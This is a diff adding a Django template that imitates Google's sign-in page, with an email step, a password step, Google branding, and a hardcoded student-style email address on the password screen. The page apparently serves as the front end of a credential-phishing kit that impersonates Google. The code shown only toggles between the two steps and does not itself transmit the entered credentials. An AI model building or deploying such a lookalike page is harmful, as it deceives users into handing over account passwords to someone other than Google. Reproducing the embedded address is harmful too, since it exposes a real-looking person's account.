@@ -1,0 +1,55 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nemo Test</title>
+    <link rel="stylesheet" href="{% static 'css/google.css' %}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+    <div class="login-box">
+        <img src='https://cdn.vox-cdn.com/thumbor/Pkmq1nm3skO0-j693JTMd7RL0Zk=/0x0:2012x1341/1200x800/filters:focal(0x0:2012x1341)/cdn.vox-cdn.com/uploads/chorus_image/image/47070706/google2.0.0.jpg'>
+        <div id="log" class="transition-left">
+            <p>Sign in</p>
+            <x1> Use your Google Account</x1>
+            <div class="inputBox">
+                <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
+                <label>Email or phone</label>
+            </div>
+            <br>
+            <x2> Forgot email?</x2>
+            <small>Not your computer? Use a private browsing window to sign<br> in.<span> <a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more</a></span></small>
+            <x3> Create Account</x3>
+            <button type="button" onclick="haha()"> Next </button>
+        </div>
+        <div id="pw" style="display: none;" class="transition-right">
+            <p>Welcome</p>
+            <x1> <button class="wow"><i class="fa fa-user-circle-o" style="font-weight: bold;margin-left: 10px;"><vv style="margin-left: 10px;margin-right: 10px;">sw20d025@mandakh.edu.mn</vv></i></button></x1>
+            <div class="inputBox">
+                <input type="password" name="password" required onkeyup="this.setAttribute('value', this.value);" value="">
+                <label>Enter your password</label>
+            </div>
+            <br>
+            <x2 style="color: black; font-weight: 100;">
+                <input type="checkbox" class="checkbox">Show password
+            </x2>
+            <small>Not your computer? Use a private browsing window to sign<br> in.<span> <a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more</a></span></small>
+            <x3>Forgot password?</x3>
+            <button type="button" onclick="haha()"> Next </button>
+        </div>
+    </div>
+    <script>
+        function haha() {
+            var divElement = document.getElementById('log');
+            var divElement2 = document.getElementById('pw');
+            divElement.classList.add('move');
+            setTimeout(function() {
+                divElement.style.display = 'none';
+                divElement2.style.display = 'block';
+            }, 600);
+        }
+    </script>
+</body>
+</html>
